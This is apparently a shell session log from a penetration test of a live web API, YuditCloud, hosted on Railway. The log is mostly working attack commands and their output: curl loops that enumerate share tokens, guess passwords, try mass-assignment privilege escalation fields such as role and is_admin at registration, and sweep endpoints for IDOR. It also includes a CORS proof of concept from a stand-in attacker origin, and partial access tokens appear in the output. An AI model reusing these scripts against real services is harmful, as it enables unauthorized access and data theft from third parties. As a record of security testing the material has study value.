+  /collaborators/admin → 405 (31 bytes)
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+
+echo "=== Enumerasi share token 1..100 ==="
+: > api/share-enum.txt
+for token in $(seq 1 100); do
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' --max-time 3 "$BE/share/$token/info")
+  size=$(wc -c < /tmp/r)
+  if [ "$code" != "404" ] && [ "$code" != "500" ]; then
+    echo "  /share/$token/info → $code ($size bytes)"
+    cat /tmp/r >> "exploit/share-$token.json"; echo >> "exploit/share-$token.json"
+    echo "/share/$token/info → $code ($size bytes)" >> api/share-enum.txt
+  fi
+done
+
+# Kalau 500 untuk semua, coba dengan password param
+echo "=== Coba share 1 dengan password ==="
+for pw in test password admin "" "1"; do
+  code=$(curl -sS -o /tmp/r -w '%{http_code}' "$BE/share/1/info?password=$pw")
+  echo "  password='$pw' → $code | $(head -c 100 /tmp/r)"
+done
+=== Enumerasi share token 1..100 ===
+curl: (28) Resolving timed out after 3000 milliseconds
+  /share/13/info → 000 (34 bytes)
+curl: (28) Operation timed out after 3001 milliseconds with 0 bytes received
+  /share/14/info → 000 (34 bytes)
+
+=== Coba share 1 dengan password ===
+  password='test' → 500 | {"detail":"Internal server error"}
+  password='password' → 500 | {"detail":"Internal server error"}
+  password='admin' → 500 | {"detail":"Internal server error"}
+  password='' → 500 | {"detail":"Internal server error"}
+  password='1' → 500 | {"detail":"Internal server error"}
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ set +H
+BE="https://web-production-c8591.up.railway.app"
+
+for field in role is_admin isAdmin is_superuser verified email_verified plan credits quota; do
+  USER="ma$(date +%s%N)"
+  EMAIL="$USER@example.com"
+  body=$(printf '{"email":"%s","username":"%s","password":"Pentest123AAaa","%s":%s}' \
+    "$EMAIL" "$USER" "$field" "$(case $field in role|plan) echo '"admin"';; *) echo 'true';; esac)")
+  resp=$(curl -sS -X POST "$BE/auth/register" -H "Content-Type: application/json" -d "$body" \
+    -w '\n[%{http_code}]' -o /tmp/mr)
+  code=$(echo "$resp" | tail -1)
+  echo "  field=$field → $code | $(head -c 150 /tmp/mr)"
+done
+  field=role → [200] | {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI4NWY2OWNlNS1mMmNmLTQxNTgtOTk3ZC03ZTY3MWRmZWMyNDQiLCJleHAiOjE3OTM4NzA0NDh9.CDh5JNmq1JW
+  field=is_admin → [200] | {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0YzIwYzRhMy00ZjRmLTRhN2MtYTZjOS00NDgwNDliMTYxMTgiLCJleHAiOjE3OTM4NzA0NTN9.RhqRXI7IOY8
+  field=isAdmin → [200] | {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxODY0MTBiOC05MjMyLTQ1ZTgtYjhhNy01MTgwODE0N2UzNzMiLCJleHAiOjE3OTM4NzA0NTh9.OQfEqaise_R
+  field=is_superuser → [200] | {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkNzMwNWNiZS01OTQ3LTQ3NDYtODQzMy03MGRiYTdjZGQ1YWQiLCJleHAiOjE3OTM4NzA0NjN9.TnE3bjnzbmV
+  field=verified → [200] | {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhN2JiZjc1NC0yNmNiLTRlNmEtYTY3MS1jOGU1NTBjODdhZTMiLCJleHAiOjE3OTM4NzA0Njh9.w2YS8fH3dtY
+  field=email_verified → [200] | {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI4ZTlmOGEwMi1jOTYwLTQ4NGEtOGQ5Ni04NWExZGJlY2FhZDEiLCJleHAiOjE3OTM4NzA0NzN9.PEHgkuHIUaQ
+  field=plan → [200] | {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2Njg5MzQ1ZS1kMWE3LTQyOTQtODI5YS1lNTM1ZTJjNDIxNWQiLCJleHAiOjE3OTM4NzA0Nzd9.MX4HchdSNmh
+  field=credits → [200] | {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJlNmNlY2FhNi0yMjgxLTQ3OWQtYjE2NS1lNDQ3Y2Y1YjUyODkiLCJleHAiOjE3OTM4NzA0ODJ9.OmBeAmEYNid
+  field=quota → [200] | {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJmZjU0MWE5Mi0zZDc3LTQwNWYtYjg3OC03OWRiNTllNmUyOWYiLCJleHAiOjE3OTM4NzA0ODh9.8YliG4rvuOj
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ 
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+# 1. Download & parse OpenAPI
+curl -sS "$BE/openapi.json" -o api/openapi.json
+echo "Total endpoint: $(jq '.paths | length' api/openapi.json)"
+jq -r '.paths | keys[]' api/openapi.json | sort | head -50
+
+# 2. Cari public endpoint (no auth)
+jq -r '.paths | to_entries[] | .key as $p | .value | to_entries[] |
+  select(.value.security == null or .value.security == []) |
+  "\(.key | ascii_upcase) \($p)"' api/openapi.json
+
+# 3. Register akun
+REG_EMAIL="pentest-$(date +%s)@example.com"
+curl -sS -X POST "$BE/auth/register" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$REG_EMAIL\",\"password\":\"Pentest123!@#\",\"name\":\"Pentest\"}" \
+  -w '\n[%{http_code}]\n' -o api/reg.json
+cat api/reg.json
+
+# 4. Login
+curl -sS -X POST "$BE/auth/login" -H "Content-Type: application/json" \
+  -d "{\"email\":\"$REG_EMAIL\",\"password\":\"Pentest123!@#\"}" \
+  -w '\n[%{http_code}]\n' -o api/login.json
+cat api/login.json | jq .
+
+# 5. CORS PoC (simulasi attacker.vercel.app)
+curl -sS -D /tmp/h.txt -o /tmp/b.txt \
+  -H "Origin: https://attacker.vercel.app" "$BE/files/"
+grep -i access-control /tmp/h.txt
+head -c 300 /tmp/b.txt
+Total endpoint: 57
+/
+/assignments/
+/assignments/{assignment_id}
+/assignments/file/{file_id}
+/assignments/my
+/assignments/user/{user_id}
+/auth/change-password
+/auth/login
+/auth/register
+/categories/
+/categories/{category_id}
+/collaborators/
+/collaborators/{user_id}
+/conversions/
+/conversions/files/{file_id}/lineage
+/conversions/jobs
+/conversions/operations
+/cors-check
+/docs/{file_id}
+/docs/{file_id}/convert-to-gdoc
+/docs/{file_id}/google-doc
+/docs/{file_id}/google-doc-info
+/docs/{file_id}/raw
+/docs/{file_id}/sync-from-gdoc
+/docs/{file_id}/upload-image
+/docs/{file_id}/versions
+/docs/{file_id}/versions/{version_number}
+/docs/{file_id}/versions/{version_number}/restore
+/drives/
+/drives/{drive_id}
+/drives/pool
+/drives/refresh-quota
+/files/
+/files/bulk-category
+/files/bulk-delete
+/files/categories
+/files/{file_id}
+/files/{file_id}/category
+/files/{file_id}/download
+/files/{file_id}/preview
+/files/{file_id}/reclassify
+/files/monthly-folders
+/files/stats
+/files/upload
+/folders/
+/folders/{folder_id}
+/health
+/notifications/cron/drive-health-check
+/notifications/cron/monthly-report
+/notifications/health
+POST /auth/register
+POST /auth/login
+GET /oauth/google/callback
+GET /share/{token}/info
+GET /share/{token}/download
+GET /share/{token}/preview
+GET /conversions/operations
+POST /notifications/cron/monthly-report
+POST /notifications/cron/drive-health-check
+GET /
+GET /health
+GET /cors-check
+bash: !@#\: event not found
+
+[422]
+{"detail":[{"type":"missing","loc":["body"],"msg":"Field required","input":null}]}bash: !@#\: event not found
+
+[422]
+{
+  "detail": [
+    {
+      "type": "missing",
+      "loc": [
+        "body"
+      ],
+      "msg": "Field required",
+      "input": null
+    }
+  ]
+}
+access-control-allow-credentials: true
+access-control-allow-origin: https://attacker.vercel.app
+access-control-expose-headers: X-Drive-Error, X-Drive-Email, X-Drive-Id, X-Error-Code
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+TOKEN=$(cat api/token.txt 2>/dev/null)
+
+# Extract semua path + parameter
+jq -r '.paths | to_entries[] | .key as $p | .value | to_entries[] |
+  .value.parameters[]? | "\(.in)|\(.name)|\($p)"' api/openapi.json \
+  > api/params-matrix.txt
+wc -l api/params-matrix.txt
+
+# Test IDOR: parameter {id} → 1,2,3,admin
+: > api/idor-matrix.txt
+jq -r '.paths | to_entries[] | select(.key | test("\\{")) |
+  .key as $p | .value | keys[] as $m | "\($m)|\($p)"' api/openapi.json \
+  | sort -u | while IFS='|' read -r method path; do
+  for id in 1 2 3 admin test 0; do
+    real=$(echo "$path" | sed "s/{[^}]*}/$id/g")
+    code=$(curl -sS -o /tmp/ir -w '%{http_code}' -X "${method^^}" \
+      -H "Authorization: Bearer $TOKEN" "$BE$real")
+    size=$(wc -c < /tmp/ir)
+    if [ "$code" != "404" ] && [ "$code" != "000" ]; then
+      printf '%-40s %s → %s (%s bytes)\n' "$real" "${method^^}" "$code" "$size" \
+        | tee -a api/idor-matrix.txt
+    fi
+  done
+done
+
+echo "=== IDOR hits ==="
+cat api/idor-matrix.txt
+54 api/params-matrix.txt
+/assignments/1                           DELETE → 401 (30 bytes)
+/assignments/2                           DELETE → 401 (30 bytes)
+/assignments/3                           DELETE → 401 (30 bytes)
+/assignments/admin                       DELETE → 401 (30 bytes)
+/assignments/test                        DELETE → 401 (30 bytes)
+/assignments/0                           DELETE → 401 (30 bytes)
+/categories/1                            DELETE → 401 (30 bytes)
+/categories/2                            DELETE → 401 (30 bytes)
+/categories/3                            DELETE → 401 (30 bytes)
+/categories/admin                        DELETE → 401 (30 bytes)
+/categories/test                         DELETE → 401 (30 bytes)
+/categories/0                            DELETE → 401 (30 bytes)
+/collaborators/1                         DELETE → 401 (30 bytes)
+/collaborators/2                         DELETE → 401 (30 bytes)
+/collaborators/3                         DELETE → 401 (30 bytes)
+/collaborators/admin                     DELETE → 401 (30 bytes)
+/collaborators/test                      DELETE → 401 (30 bytes)
+/collaborators/0                         DELETE → 401 (30 bytes)
+/docs/1/google-doc                       DELETE → 401 (30 bytes)
+/docs/2/google-doc                       DELETE → 401 (30 bytes)
+/docs/3/google-doc                       DELETE → 401 (30 bytes)
+/docs/admin/google-doc                   DELETE → 401 (30 bytes)
+/docs/test/google-doc                    DELETE → 401 (30 bytes)
+/docs/0/google-doc                       DELETE → 401 (30 bytes)
+/drives/1                                DELETE → 401 (30 bytes)
+/drives/2                                DELETE → 401 (30 bytes)
+/drives/3                                DELETE → 401 (30 bytes)
+/drives/admin                            DELETE → 401 (30 bytes)
+/drives/test                             DELETE → 401 (30 bytes)
+/drives/0                                DELETE → 401 (30 bytes)
+/files/1                                 DELETE → 401 (30 bytes)
+/files/2                                 DELETE → 401 (30 bytes)
+/files/3                                 DELETE → 401 (30 bytes)
+/files/admin                             DELETE → 401 (30 bytes)
+/files/test                              DELETE → 401 (30 bytes)
+/files/0                                 DELETE → 401 (30 bytes)
+/folders/1                               DELETE → 401 (30 bytes)
+/folders/2                               DELETE → 401 (30 bytes)
+/folders/3                               DELETE → 401 (30 bytes)
+/folders/admin                           DELETE → 401 (30 bytes)
+/folders/test                            DELETE → 401 (30 bytes)
+/folders/0                               DELETE → 401 (30 bytes)
+/share/1                                 DELETE → 401 (30 bytes)
+/share/2                                 DELETE → 401 (30 bytes)
+/share/3                                 DELETE → 401 (30 bytes)
+/share/admin                             DELETE → 401 (30 bytes)
+/share/test                              DELETE → 401 (30 bytes)
+/share/0                                 DELETE → 401 (30 bytes)
+/assignments/file/1                      GET → 401 (30 bytes)
+/assignments/file/2                      GET → 401 (30 bytes)
+/assignments/file/3                      GET → 401 (30 bytes)
+/assignments/file/admin                  GET → 401 (30 bytes)
+/assignments/file/test                   GET → 401 (30 bytes)
+/assignments/file/0                      GET → 401 (30 bytes)
+/assignments/user/1                      GET → 401 (30 bytes)
+/assignments/user/2                      GET → 401 (30 bytes)
+/assignments/user/3                      GET → 401 (30 bytes)
+/assignments/user/admin                  GET → 401 (30 bytes)
+/assignments/user/test                   GET → 401 (30 bytes)
+/assignments/user/0                      GET → 401 (30 bytes)
+/conversions/files/1/lineage             GET → 401 (30 bytes)
+/conversions/files/2/lineage             GET → 401 (30 bytes)
+/conversions/files/3/lineage             GET → 401 (30 bytes)
+/conversions/files/admin/lineage         GET → 401 (30 bytes)
+/conversions/files/test/lineage          GET → 401 (30 bytes)
+/conversions/files/0/lineage             GET → 401 (30 bytes)
+/docs/1                                  GET → 401 (30 bytes)
+/docs/2                                  GET → 401 (30 bytes)
+/docs/3                                  GET → 401 (30 bytes)
+/docs/admin                              GET → 401 (30 bytes)
+/docs/test                               GET → 401 (30 bytes)
+/docs/0                                  GET → 401 (30 bytes)
+/docs/1/google-doc-info                  GET → 401 (30 bytes)
+/docs/2/google-doc-info                  GET → 401 (30 bytes)
+/docs/3/google-doc-info                  GET → 401 (30 bytes)
+/docs/admin/google-doc-info              GET → 401 (30 bytes)
+/docs/test/google-doc-info               GET → 401 (30 bytes)
+/docs/0/google-doc-info                  GET → 401 (30 bytes)
+/docs/1/raw                              GET → 401 (30 bytes)
+/docs/2/raw                              GET → 401 (30 bytes)
+/docs/3/raw                              GET → 401 (30 bytes)
+/docs/admin/raw                          GET → 401 (30 bytes)
+/docs/test/raw                           GET → 401 (30 bytes)
+/docs/0/raw                              GET → 401 (30 bytes)
+/docs/1/versions                         GET → 401 (30 bytes)
+/docs/2/versions                         GET → 401 (30 bytes)
+/docs/3/versions                         GET → 401 (30 bytes)
+/docs/admin/versions                     GET → 401 (30 bytes)
+/docs/test/versions                      GET → 401 (30 bytes)
+/docs/0/versions                         GET → 401 (30 bytes)
+/docs/1/versions/1                       GET → 401 (30 bytes)
+/docs/2/versions/2                       GET → 401 (30 bytes)
+/docs/3/versions/3                       GET → 401 (30 bytes)
+/docs/admin/versions/admin               GET → 401 (30 bytes)
+/docs/test/versions/test                 GET → 401 (30 bytes)
+/docs/0/versions/0                       GET → 401 (30 bytes)
+/files/1/download                        GET → 401 (30 bytes)
+/files/2/download                        GET → 401 (30 bytes)
+/files/3/download                        GET → 401 (30 bytes)
+/files/admin/download                    GET → 401 (30 bytes)
+/files/test/download                     GET → 401 (30 bytes)
+/files/0/download                        GET → 401 (30 bytes)
+/files/1/preview                         GET → 401 (30 bytes)
+/files/2/preview                         GET → 401 (30 bytes)
+/files/3/preview                         GET → 401 (30 bytes)
+/files/admin/preview                     GET → 401 (30 bytes)
+/files/test/preview                      GET → 401 (30 bytes)
+/files/0/preview                         GET → 401 (30 bytes)
+/share/1/download                        GET → 500 (34 bytes)
+/share/2/download                        GET → 500 (34 bytes)
+/share/3/download                        GET → 500 (34 bytes)
+/share/admin/download                    GET → 500 (34 bytes)
+/share/test/download                     GET → 500 (34 bytes)
+/share/0/download                        GET → 500 (34 bytes)
+/share/1/info                            GET → 500 (34 bytes)
+/share/2/info                            GET → 500 (34 bytes)
+/share/3/info                            GET → 500 (34 bytes)
+/share/admin/info                        GET → 500 (34 bytes)
+/share/test/info                         GET → 500 (34 bytes)
+/share/0/info                            GET → 500 (34 bytes)
+/share/1/preview                         GET → 500 (34 bytes)
+/share/2/preview                         GET → 500 (34 bytes)
+/share/3/preview                         GET → 500 (34 bytes)
+/share/admin/preview                     GET → 500 (34 bytes)
+/share/test/preview                      GET → 500 (34 bytes)
+/share/0/preview                         GET → 500 (34 bytes)
+/categories/1                            PATCH → 401 (30 bytes)
+/categories/2                            PATCH → 401 (30 bytes)
+/categories/3                            PATCH → 401 (30 bytes)
+/categories/admin                        PATCH → 401 (30 bytes)
+/categories/test                         PATCH → 401 (30 bytes)
+/categories/0                            PATCH → 401 (30 bytes)
+/collaborators/1                         PATCH → 401 (30 bytes)
+/collaborators/2                         PATCH → 401 (30 bytes)
+/collaborators/3                         PATCH → 401 (30 bytes)
+/collaborators/admin                     PATCH → 401 (30 bytes)
+/collaborators/test                      PATCH → 401 (30 bytes)
+/collaborators/0                         PATCH → 401 (30 bytes)
+/docs/1                                  PATCH → 401 (30 bytes)
+/docs/2                                  PATCH → 401 (30 bytes)
+/docs/3                                  PATCH → 401 (30 bytes)
+/docs/admin                              PATCH → 401 (30 bytes)
+/docs/test                               PATCH → 401 (30 bytes)
+/docs/0                                  PATCH → 401 (30 bytes)
+/files/1/category                        PATCH → 401 (30 bytes)
+/files/2/category                        PATCH → 401 (30 bytes)
+/files/3/category                        PATCH → 401 (30 bytes)
+/files/admin/category                    PATCH → 401 (30 bytes)
+/files/test/category                     PATCH → 401 (30 bytes)
+/files/0/category                        PATCH → 401 (30 bytes)
+/docs/1/convert-to-gdoc                  POST → 401 (30 bytes)
+/docs/2/convert-to-gdoc                  POST → 401 (30 bytes)
+/docs/3/convert-to-gdoc                  POST → 401 (30 bytes)
+/docs/admin/convert-to-gdoc              POST → 401 (30 bytes)
+/docs/test/convert-to-gdoc               POST → 401 (30 bytes)
+/docs/0/convert-to-gdoc                  POST → 401 (30 bytes)
+/docs/1/sync-from-gdoc                   POST → 401 (30 bytes)
+/docs/2/sync-from-gdoc                   POST → 401 (30 bytes)
+/docs/3/sync-from-gdoc                   POST → 401 (30 bytes)
+/docs/admin/sync-from-gdoc               POST → 401 (30 bytes)
+/docs/test/sync-from-gdoc                POST → 401 (30 bytes)
+/docs/0/sync-from-gdoc                   POST → 401 (30 bytes)
+/docs/1/upload-image                     POST → 401 (30 bytes)
+/docs/2/upload-image                     POST → 401 (30 bytes)
+/docs/3/upload-image                     POST → 401 (30 bytes)
+/docs/admin/upload-image                 POST → 401 (30 bytes)
+/docs/test/upload-image                  POST → 401 (30 bytes)
+/docs/0/upload-image                     POST → 401 (30 bytes)
+/docs/1/versions/1/restore               POST → 401 (30 bytes)
+/docs/2/versions/2/restore               POST → 401 (30 bytes)
+/docs/3/versions/3/restore               POST → 401 (30 bytes)
+/docs/admin/versions/admin/restore       POST → 401 (30 bytes)
+/docs/test/versions/test/restore         POST → 401 (30 bytes)
+/docs/0/versions/0/restore               POST → 401 (30 bytes)
+/files/1/reclassify                      POST → 401 (30 bytes)
+/files/2/reclassify                      POST → 401 (30 bytes)
+/files/3/reclassify                      POST → 401 (30 bytes)
+/files/admin/reclassify                  POST → 401 (30 bytes)
+/files/test/reclassify                   POST → 401 (30 bytes)
+/files/0/reclassify                      POST → 401 (30 bytes)
+=== IDOR hits ===
+/assignments/1                           DELETE → 401 (30 bytes)
+/assignments/2                           DELETE → 401 (30 bytes)
+/assignments/3                           DELETE → 401 (30 bytes)
+/assignments/admin                       DELETE → 401 (30 bytes)
+/assignments/test                        DELETE → 401 (30 bytes)
+/assignments/0                           DELETE → 401 (30 bytes)
+/categories/1                            DELETE → 401 (30 bytes)
+/categories/2                            DELETE → 401 (30 bytes)
+/categories/3                            DELETE → 401 (30 bytes)
+/categories/admin                        DELETE → 401 (30 bytes)
+/categories/test                         DELETE → 401 (30 bytes)
+/categories/0                            DELETE → 401 (30 bytes)
+/collaborators/1                         DELETE → 401 (30 bytes)
+/collaborators/2                         DELETE → 401 (30 bytes)
+/collaborators/3                         DELETE → 401 (30 bytes)
+/collaborators/admin                     DELETE → 401 (30 bytes)
+/collaborators/test                      DELETE → 401 (30 bytes)
+/collaborators/0                         DELETE → 401 (30 bytes)
+/docs/1/google-doc                       DELETE → 401 (30 bytes)
+/docs/2/google-doc                       DELETE → 401 (30 bytes)
+/docs/3/google-doc                       DELETE → 401 (30 bytes)
+/docs/admin/google-doc                   DELETE → 401 (30 bytes)
+/docs/test/google-doc                    DELETE → 401 (30 bytes)
+/docs/0/google-doc                       DELETE → 401 (30 bytes)
+/drives/1                                DELETE → 401 (30 bytes)
+/drives/2                                DELETE → 401 (30 bytes)
+/drives/3                                DELETE → 401 (30 bytes)
+/drives/admin                            DELETE → 401 (30 bytes)
+/drives/test                             DELETE → 401 (30 bytes)
+/drives/0                                DELETE → 401 (30 bytes)
+/files/1                                 DELETE → 401 (30 bytes)
+/files/2                                 DELETE → 401 (30 bytes)
+/files/3                                 DELETE → 401 (30 bytes)
+/files/admin                             DELETE → 401 (30 bytes)
+/files/test                              DELETE → 401 (30 bytes)
+/files/0                                 DELETE → 401 (30 bytes)
+/folders/1                               DELETE → 401 (30 bytes)
+/folders/2                               DELETE → 401 (30 bytes)
+/folders/3                               DELETE → 401 (30 bytes)
+/folders/admin                           DELETE → 401 (30 bytes)
+/folders/test                            DELETE → 401 (30 bytes)
+/folders/0                               DELETE → 401 (30 bytes)
+/share/1                                 DELETE → 401 (30 bytes)
+/share/2                                 DELETE → 401 (30 bytes)
+/share/3                                 DELETE → 401 (30 bytes)
+/share/admin                             DELETE → 401 (30 bytes)
+/share/test                              DELETE → 401 (30 bytes)
+/share/0                                 DELETE → 401 (30 bytes)
+/assignments/file/1                      GET → 401 (30 bytes)
+/assignments/file/2                      GET → 401 (30 bytes)
+/assignments/file/3                      GET → 401 (30 bytes)
+/assignments/file/admin                  GET → 401 (30 bytes)
+/assignments/file/test                   GET → 401 (30 bytes)
+/assignments/file/0                      GET → 401 (30 bytes)
+/assignments/user/1                      GET → 401 (30 bytes)
+/assignments/user/2                      GET → 401 (30 bytes)
+/assignments/user/3                      GET → 401 (30 bytes)
+/assignments/user/admin                  GET → 401 (30 bytes)
+/assignments/user/test                   GET → 401 (30 bytes)
+/assignments/user/0                      GET → 401 (30 bytes)
+/conversions/files/1/lineage             GET → 401 (30 bytes)
+/conversions/files/2/lineage             GET → 401 (30 bytes)
+/conversions/files/3/lineage             GET → 401 (30 bytes)
+/conversions/files/admin/lineage         GET → 401 (30 bytes)
+/conversions/files/test/lineage          GET → 401 (30 bytes)
+/conversions/files/0/lineage             GET → 401 (30 bytes)
+/docs/1                                  GET → 401 (30 bytes)
+/docs/2                                  GET → 401 (30 bytes)
+/docs/3                                  GET → 401 (30 bytes)
+/docs/admin                              GET → 401 (30 bytes)
+/docs/test                               GET → 401 (30 bytes)
+/docs/0                                  GET → 401 (30 bytes)
+/docs/1/google-doc-info                  GET → 401 (30 bytes)
+/docs/2/google-doc-info                  GET → 401 (30 bytes)
+/docs/3/google-doc-info                  GET → 401 (30 bytes)
+/docs/admin/google-doc-info              GET → 401 (30 bytes)
+/docs/test/google-doc-info               GET → 401 (30 bytes)
+/docs/0/google-doc-info                  GET → 401 (30 bytes)
+/docs/1/raw                              GET → 401 (30 bytes)
+/docs/2/raw                              GET → 401 (30 bytes)
+/docs/3/raw                              GET → 401 (30 bytes)
+/docs/admin/raw                          GET → 401 (30 bytes)
+/docs/test/raw                           GET → 401 (30 bytes)
+/docs/0/raw                              GET → 401 (30 bytes)
+/docs/1/versions                         GET → 401 (30 bytes)
+/docs/2/versions                         GET → 401 (30 bytes)
+/docs/3/versions                         GET → 401 (30 bytes)
+/docs/admin/versions                     GET → 401 (30 bytes)
+/docs/test/versions                      GET → 401 (30 bytes)
+/docs/0/versions                         GET → 401 (30 bytes)
+/docs/1/versions/1                       GET → 401 (30 bytes)
+/docs/2/versions/2                       GET → 401 (30 bytes)
+/docs/3/versions/3                       GET → 401 (30 bytes)
+/docs/admin/versions/admin               GET → 401 (30 bytes)
+/docs/test/versions/test                 GET → 401 (30 bytes)
+/docs/0/versions/0                       GET → 401 (30 bytes)
+/files/1/download                        GET → 401 (30 bytes)
+/files/2/download                        GET → 401 (30 bytes)
+/files/3/download                        GET → 401 (30 bytes)
+/files/admin/download                    GET → 401 (30 bytes)
+/files/test/download                     GET → 401 (30 bytes)
+/files/0/download                        GET → 401 (30 bytes)
+/files/1/preview                         GET → 401 (30 bytes)
+/files/2/preview                         GET → 401 (30 bytes)
+/files/3/preview                         GET → 401 (30 bytes)
+/files/admin/preview                     GET → 401 (30 bytes)
+/files/test/preview                      GET → 401 (30 bytes)
+/files/0/preview                         GET → 401 (30 bytes)
+/share/1/download                        GET → 500 (34 bytes)
+/share/2/download                        GET → 500 (34 bytes)
+/share/3/download                        GET → 500 (34 bytes)
+/share/admin/download                    GET → 500 (34 bytes)
+/share/test/download                     GET → 500 (34 bytes)
+/share/0/download                        GET → 500 (34 bytes)
+/share/1/info                            GET → 500 (34 bytes)
+/share/2/info                            GET → 500 (34 bytes)
+/share/3/info                            GET → 500 (34 bytes)
+/share/admin/info                        GET → 500 (34 bytes)
+/share/test/info                         GET → 500 (34 bytes)
+/share/0/info                            GET → 500 (34 bytes)
+/share/1/preview                         GET → 500 (34 bytes)
+/share/2/preview                         GET → 500 (34 bytes)
+/share/3/preview                         GET → 500 (34 bytes)
+/share/admin/preview                     GET → 500 (34 bytes)
+/share/test/preview                      GET → 500 (34 bytes)
+/share/0/preview                         GET → 500 (34 bytes)
+/categories/1                            PATCH → 401 (30 bytes)
+/categories/2                            PATCH → 401 (30 bytes)
+/categories/3                            PATCH → 401 (30 bytes)
+/categories/admin                        PATCH → 401 (30 bytes)
+/categories/test                         PATCH → 401 (30 bytes)
+/categories/0                            PATCH → 401 (30 bytes)
+/collaborators/1                         PATCH → 401 (30 bytes)
+/collaborators/2                         PATCH → 401 (30 bytes)
+/collaborators/3                         PATCH → 401 (30 bytes)
+/collaborators/admin                     PATCH → 401 (30 bytes)
+/collaborators/test                      PATCH → 401 (30 bytes)
+/collaborators/0                         PATCH → 401 (30 bytes)
+/docs/1                                  PATCH → 401 (30 bytes)
+/docs/2                                  PATCH → 401 (30 bytes)
+/docs/3                                  PATCH → 401 (30 bytes)
+/docs/admin                              PATCH → 401 (30 bytes)
+/docs/test                               PATCH → 401 (30 bytes)
+/docs/0                                  PATCH → 401 (30 bytes)
+/files/1/category                        PATCH → 401 (30 bytes)
+/files/2/category                        PATCH → 401 (30 bytes)
+/files/3/category                        PATCH → 401 (30 bytes)
+/files/admin/category                    PATCH → 401 (30 bytes)
+/files/test/category                     PATCH → 401 (30 bytes)
+/files/0/category                        PATCH → 401 (30 bytes)
+/docs/1/convert-to-gdoc                  POST → 401 (30 bytes)
+/docs/2/convert-to-gdoc                  POST → 401 (30 bytes)
+/docs/3/convert-to-gdoc                  POST → 401 (30 bytes)
+/docs/admin/convert-to-gdoc              POST → 401 (30 bytes)
+/docs/test/convert-to-gdoc               POST → 401 (30 bytes)
+/docs/0/convert-to-gdoc                  POST → 401 (30 bytes)
+/docs/1/sync-from-gdoc                   POST → 401 (30 bytes)
+/docs/2/sync-from-gdoc                   POST → 401 (30 bytes)
+/docs/3/sync-from-gdoc                   POST → 401 (30 bytes)
+/docs/admin/sync-from-gdoc               POST → 401 (30 bytes)
+/docs/test/sync-from-gdoc                POST → 401 (30 bytes)
+/docs/0/sync-from-gdoc                   POST → 401 (30 bytes)
+/docs/1/upload-image                     POST → 401 (30 bytes)
+/docs/2/upload-image                     POST → 401 (30 bytes)
+/docs/3/upload-image                     POST → 401 (30 bytes)
+/docs/admin/upload-image                 POST → 401 (30 bytes)
+/docs/test/upload-image                  POST → 401 (30 bytes)
+/docs/0/upload-image                     POST → 401 (30 bytes)
+/docs/1/versions/1/restore               POST → 401 (30 bytes)
+/docs/2/versions/2/restore               POST → 401 (30 bytes)
+/docs/3/versions/3/restore               POST → 401 (30 bytes)
+/docs/admin/versions/admin/restore       POST → 401 (30 bytes)
+/docs/test/versions/test/restore         POST → 401 (30 bytes)
+/docs/0/versions/0/restore               POST → 401 (30 bytes)
+/files/1/reclassify                      POST → 401 (30 bytes)
+/files/2/reclassify                      POST → 401 (30 bytes)
+/files/3/reclassify                      POST → 401 (30 bytes)
+/files/admin/reclassify                  POST → 401 (30 bytes)
+/files/test/reclassify                   POST → 401 (30 bytes)
+/files/0/reclassify                      POST → 401 (3
+pathoskratos@pathos:~/Documents/audit-clouddatadprd$ cd ~/Documents/audit-clouddatadprd
+BE="https://web-production-c8591.up.railway.app"
+
+# Download
+curl -sS "$BE/openapi.json" -o api/openapi.json
+curl -sS "$BE/docs" -o api/docs.html
+curl -sS "$BE/redoc" -o api/redoc.html
+
+echo "=== Title & Version ==="
+jq -r '.info | "\(.title) v\(.version)\n\(.description // "")"' api/openapi.json
+
+echo "=== Servers ==="
+jq '.servers' api/openapi.json
+
+echo "=== Security Schemes ==="
+jq '.components.securitySchemes' api/openapi.json
+
+echo "=== Total Endpoints ==="
+jq '.paths | length' api/openapi.json
+
+echo "=== ALL ENDPOINTS (method + path) ==="
+jq -r '.paths | to_entries[] | .key as $p | .value | keys[] | "\(. | ascii_upcase) \($p)"' api/openapi.json | sort
+
+echo "=== Endpoint tanpa security (public) ==="
+jq -r '.paths | to_entries[] | .key as $p | .value | to_entries[] |
+  select(.value.security == null or .value.security == []) |
+  "\(.key | ascii_upcase) \($p)"' api/openapi.json | sort
+
+echo "=== Endpoint dengan security ==="
+jq -r '.paths | to_entries[] | .key as $p | .value | to_entries[] |
+  select(.value.security != null and .value.security != []) |
+  "\(.key | ascii_upcase) \($p) \(.value.security)"' api/openapi.json | sort
+=== Title & Version ===
+YuditCloud v1.0.0
+
+=== Servers ===
+null
+=== Security Schemes ===
+{
+  "HTTPBearer": {
+    "type": "http",
+    "scheme": "bearer"
+  }
+}
+=== Total Endpoints ===
+57
+=== ALL ENDPOINTS (method + path) ===
+DELETE /assignments/{assignment_id}
+DELETE /categories/{category_id}
+DELETE /collaborators/{user_id}
+DELETE /docs/{file_id}/google-doc
+DELETE /drives/{drive_id}
+DELETE /files/{file_id}
+DELETE /folders/{folder_id}
